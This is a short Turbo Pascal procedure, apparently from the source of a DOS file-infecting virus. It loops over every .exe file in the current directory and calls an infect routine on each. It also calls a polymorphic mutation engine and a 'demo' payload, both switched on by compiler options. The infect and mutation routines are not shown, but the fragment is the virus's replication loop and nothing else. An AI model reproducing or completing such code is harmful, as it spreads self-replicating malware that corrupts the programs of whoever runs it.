procedure Starting;
var n:searchrec;
begin
{$IFOPT D-}demo;{$ENDIF}
if DetectComp then
  begin
  findfirst('*.exe',$21,n);
  while doserror=0 do
    begin
    {$IFOPT S+}TPPE_Mutation;{$ENDIF}
    infect(n.name);
    findnext(n);
    end;
  end;
{$IFOPT D+}demo;{$ENDIF}
end;